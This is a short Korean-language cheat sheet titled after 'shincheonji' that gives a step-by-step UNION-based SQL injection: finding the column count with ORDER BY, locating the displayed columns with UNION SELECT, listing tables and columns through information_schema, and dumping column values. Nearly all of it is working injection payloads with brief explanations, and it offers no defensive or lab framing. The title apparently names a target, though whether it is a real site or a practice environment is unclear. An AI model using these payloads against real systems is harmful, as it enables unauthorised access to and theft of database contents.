# shincheonji (UNION SQL INJECTION)

order by: 어떤것으로 정렬 하겠다
* * *
1에서부터 1씩 늘려가며 컬럼 개수를 알아낸다.
```
aa' order by 1 #
```
* * *
정확히 어떤 컬럼들이 화면에 출력돼는지 확인한다. 만약 컬럼개수가 3개라면 "   aa' union select 1,2,3 #   " 이렇게 한다. 그리고 찍힌 숫자의 자리에 원하는 데이터를 넣을수 있다. 11번이라면 11의 자리의 원하는 데이터를 넣을수 있다.
```
aa' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23 #
```
* * *
테이블들을 출력한다. 찍힌 숫자가 11번이기 떄문데 11자리에 'table_name'을 넣은것이다.
```
aa' union select 1,2,3,4,5,6,7,8,9,10,table_name,12,13,14,15,16,17,18,19,20,21,22,23 from information_schema.tables where table_type='BASE TABLE' #
```
* * *
찾을 테이블의 이름을 넣어서 테이블의 컬럼들을 출력한다.
```
aa' union select 1,2,3,4,5,6,7,8,9,10,column_name,12,13,14,15,16,17,18,19,20,21,22,23 from information_schema.columns where table_name='테이블 이름' #
```
* * *
컬럼 값을 출력한다.
```
aa' union select 1,2,3,4,5,6,7,8,9,10,컬럼 이름,12,13,14,15,16,17,18,19,20,21,22,23 from 테이블 이름 #
```
